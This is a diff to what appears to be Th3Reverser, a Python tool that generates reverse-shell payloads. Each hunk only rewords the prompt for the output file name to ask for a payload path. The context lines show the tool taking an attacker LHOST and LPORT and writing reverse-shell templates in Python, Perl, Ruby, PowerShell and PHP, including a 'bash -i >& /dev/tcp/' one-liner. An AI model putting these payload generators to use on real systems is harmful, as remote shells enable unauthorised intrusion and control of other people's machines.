@@ -127,7 +127,7 @@ def Th3Reverser_Banner():
            print("[!] LHOST ==>", Host)
            Port = input("[+] Enter your LPORT: ")
            print("[!] LPORT ==>", Port)
-           File = input("[+] Enter the name of the Reverse Shell you want: ")
+           File = input("[+] Enter the path for the payload: ")
            f = open(File, "w+")
            S0 = """#!/usr/bin/python3
 import os
@@ -218,7 +218,7 @@ sss/               -+syyyys+:`   osss`      .ssso
            print("[!] LHOST ==>", Host)
            Port = input("[+] Enter your LPORT: ")
            print("[!] LPORT ==>", Port)
-           File = input("[+] Enter the name of the Reverse Shell you want: ")
+           File = input("[+] Enter the path for the payload: ")
            f = open(File, "w+")
            S0 = """use Socket;
 $i='"""
@@ -277,7 +277,7 @@ exec('cmd.exe');
            print("[!] LHOST ==>", Host)
            Port = input("[+] Enter your LPORT: ")
            print("[!] LPORT ==>", Port)
-           File = input("[+] Enter the name of the Reverse Shell you want: ")
+           File = input("[+] Enter the path for the payload: ")
            f = open(File, "w+")
            S0 = """#!/usr/bin/perl
 use Socket;
@@ -357,7 +357,7 @@ yhyso   /yyso  +hhs+/sy    hosooos/:      /m/
            global Port
            Port = input("[+] Enter your LPORT: ")
            print("[!] LPORT ==>", Port)
-           File = input("[+] Enter the name of the reverse shell you want: ")
+           File = input("[+] Enter the path for the payload: ")
            f = open(File, "w+")
            S0 = """require 'socket'
 c=TCPSocket.new('"""
@@ -410,7 +410,7 @@ IO.popen(cmd,"r"){|io|c.print io.read}end"""
            print("[!] LHOST ==>", Host)
            Port = input("[+] Enter your LPORT: ")
            print("[!] LPORT ==>", Port)
-           File = input("[+] Enter the name of the reverse shell you want: ")
+           File = input("[+] Enter the path for the payload: ")
            f = open(File, "w+")
            S0 = """#!/usr/bin/env ruby
 require 'socket'
@@ -475,7 +475,7 @@ exec '/bin/sh -i'"""
         print("[!] LHOST ==>", Host)
         Port = input("[+] Enter your LPORT: ")
         print("[!] LPORT ==>", Port)
-        File = input("[+] Enter the name of the reverse shell you want: ")
+        File = input("[+] Enter the path for the payload: ")
         f = open(File, "w+")
         S0 = "bash -i >& /dev/tcp/"
         S1 = Host
@@ -537,7 +537,7 @@ od-       `hd/```-sd-   sdh+  .hym.   +m+        :M/
         print("[!] LHOST ==>", Host)
         Port = input("[+] Enter your LPORT: ")
         print("[!] LPORT ==>", Port)
-        File = input("[+] Enter the name of the reverse shell you want: ")
+        File = input("[+] Enter the path for the payload: ")
         f = open(File, "w+")
         S0 = """function cleanup {
 if ($client.Connected -eq $true) {$client.Close()}
@@ -633,7 +633,7 @@ yddy   # PHP Reverse Shell #   :ddd-
         global Port
         Port = input("[+] Enter your LPORT: ")
         print("[!] LPORT ==>", Port)
-        File = input("[+] Enter the name of the reverse shell you want: ")
+        File = input("[+] Enter the path for the payload: ")
         f = open(File, "w+")
         S0 = """<?php
 set_time_limit (0);
